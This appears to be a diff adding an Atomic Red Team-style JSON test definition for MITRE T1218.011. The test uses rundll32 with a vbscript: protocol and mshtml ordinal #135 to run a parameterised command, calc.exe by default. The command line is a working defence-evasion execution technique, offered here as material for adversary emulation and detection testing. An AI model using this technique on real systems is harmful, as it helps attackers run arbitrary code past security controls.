@@ -1,0 +1,29 @@
+{
+    "name": "Rundll32 execute VBscript command using Ordinal number",
+    "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test. Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/ Upon execution calc.exe will be launched ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1218.011",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Rundll32",
+    "source": "ART",
+    "uuid": "32d1cf1b-cbc2-4c09-8d05-07ec5c83a821",
+    "arguments": {
+        "command_to_execute": {
+            "description": "Command for rundll32.exe to execute",
+            "type": "string",
+            "default": "calc.exe"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
